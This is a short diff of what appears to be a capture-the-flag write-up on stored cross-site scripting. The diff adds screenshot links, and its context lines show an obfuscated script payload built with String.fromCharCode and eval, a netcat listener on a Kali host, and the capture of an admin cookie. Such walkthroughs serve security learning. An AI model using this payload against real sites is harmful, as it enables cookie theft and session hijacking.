@@ -114,10 +114,13 @@ console.log(result);
 var payload = `<img src="x/><script>eval(String.fromCharCode(${result}));</script>">`;
 console.log(payload);
 ```
+![Ejv2od.png](https://s2.ax1x.com/2019/05/19/Ejv2od.png)
 
 Set kali listen to port 80: `nc -lvnp 80`. The code can be run in the chrome dev. Input the generated payload into the note, wait a minute the data will be sent to kali. 
 
 ![Ej5nUO.png](https://s2.ax1x.com/2019/05/19/Ej5nUO.png)
+
+![EjjOxK.png](https://s2.ax1x.com/2019/05/19/EjjOxK.png)
 
 admin cookie
 
